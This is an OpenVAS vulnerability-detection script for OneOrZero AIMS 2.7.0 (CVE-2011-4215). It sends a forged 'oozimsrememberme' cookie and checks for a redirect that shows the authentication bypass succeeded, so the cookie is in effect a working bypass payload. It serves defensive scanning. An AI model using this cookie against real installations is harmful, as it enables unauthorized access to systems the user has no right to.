###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_OneOrZero_50107.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# OneOrZero AIMS Security Bypass and SQL Injection Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "OneOrZero AIMS is prone to a security-bypass vulnerability and an SQL-
injection vulnerability.

An attacker can exploit these issues to bypass certain security
restrictions, perform unauthorized actions, bypass filtering, and
modify the logic of SQL queries.

OneOrZero AIMS 2.7.0 is affected; other versions may also be affected.";

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103304");
 script_version("$Revision: 9351 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2011-10-18 13:33:12 +0200 (Tue, 18 Oct 2011)");
 script_cve_id("CVE-2011-4215");
 script_bugtraq_id(50107);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("OneOrZero AIMS Security Bypass and SQL Injection Vulnerabilities");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/50107");
 script_xref(name : "URL" , value : "http://oneorzero.com/");
 script_xref(name : "URL" , value : "http://en.securitylab.ru/lab/PT-2011-20");
 script_xref(name : "URL" , value : "http://en.securitylab.ru/lab/PT-2011-21");
 script_xref(name : "URL" , value : "http://www.kb.cert.org/vuls/id/800227");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);

foreach dir( make_list_unique( "/ooz", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/index.php";
  buf = http_get_cache( item:url, port:port );

  if( "Powered by OneOrZero" >< buf ) {

    host = http_host_name( port:port );

    req = string("GET ", url, " HTTP/1.1\r\n",
		 "Host: ", host,"\r\n",
		 "Cookie: oozimsrememberme=eJwrtjI0tlJKTMnNzMssLilKLMkvUrJ29PQNBgBsjwh2;\r\n",
		 "\r\n\r\n" );
    res = http_keepalive_send_recv(port:port,data:req);

    if("Location: ?controller=launch" >< res) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
